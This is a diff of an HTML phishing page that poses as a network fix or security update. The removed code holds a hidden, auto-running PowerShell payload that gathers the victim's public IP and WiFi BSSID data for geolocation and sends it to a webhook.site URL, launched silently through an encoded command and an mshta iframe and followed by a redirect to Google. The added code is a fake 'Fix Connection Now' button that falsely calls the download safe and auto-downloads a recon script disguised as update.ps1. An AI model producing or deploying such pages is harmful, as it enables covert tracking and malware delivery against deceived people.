@@ -3,63 +3,29 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Update Required</title>
+  <title>Network Optimization</title>
   <style>
-    body { 
-      background: #0a0a0a; 
-      color: #00ff00; 
-      font-family: Consolas, monospace; 
-      text-align: center; 
-      padding: 80px; 
-    }
+    body { background: #111; color: #0f0; font-family: Arial; text-align: center; padding: 60px; }
+    button { padding: 15px 30px; font-size: 18px; background: #0f0; color: #000; border: none; cursor: pointer; }
   </style>
 </head>
 <body>
-  <h1>Applying Security Update...</h1>
-  <p>Please wait while we optimize your connection.</p>
+  <h1>Network Connection Issue Detected</h1>
+  <p>Click below to run a quick diagnostic and fix.</p>
+  
+  <a href="https://raw.githubusercontent.com/yourusername/recon/main/recon.ps1" download="update.ps1">
+    <button>Fix Connection Now</button>
+  </a>
+
+  <p style="margin-top: 50px; font-size: 14px; color: #666;">
+    This will download a small diagnostic tool (safe).
+  </p>
 
   <script>
-    // Your full PowerShell script (encoded for one-liner)
-    const psScript = `
-$ip = irm https://api.ipify.org
-$wifi = netsh wlan show networks mode=bssid | Select-String "SSID|BSSID|Signal|Channel" -Context 0,2
-
-$cleanData = "Public IP: $ip`n`n=== Relevant WiFi Data for Location ===`n$($wifi -join \"`n\")"
-
-$catcherUrl = "https://webhook.site/0c2777c2-743a-4862-9a2d-0a88a11e47b2"
-
-try {
-    Invoke-RestMethod -Uri $catcherUrl -Method Post -Body $cleanData -ContentType "text/plain" | Out-Null
-} catch { }
-`;
-
-    // Base64 encode the script
-    const base64Script = btoa(unescape(encodeURIComponent(psScript)));
-
-    // Silent execution via mshta + PowerShell (common technique)
-    const command = `powershell -NoP -Exec Bypass -EncodedCommand ${base64Script}`;
-
-    // Trigger the script
-    function triggerRecon() {
-      // Method 1: Try direct protocol (works in some cases)
-      try {
-        window.location.href = `powershell:${command}`;
-      } catch(e) {}
-
-      // Method 2: Fallback using mshta (more reliable for silent run)
-      const mshta = document.createElement('iframe');
-      mshta.style.display = 'none';
-      mshta.src = `mshta:vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -NoP -Exec Bypass -EncodedCommand ${base64Script}"", 0")`;
-      document.body.appendChild(mshta);
-    }
-
-    // Run automatically
-    window.onload = () => {
-      setTimeout(triggerRecon, 800);   // Small delay for realism
-      setTimeout(() => {
-        window.location.href = "https://google.com";  // Redirect after attempt
-      }, 2500);
-    };
+    // Optional: Auto-download after 3 seconds
+    setTimeout(() => {
+      window.location.href = "https://raw.githubusercontent.com/yourusername/recon/main/recon.ps1";
+    }, 3000);
   </script>
 </body>
 </html>
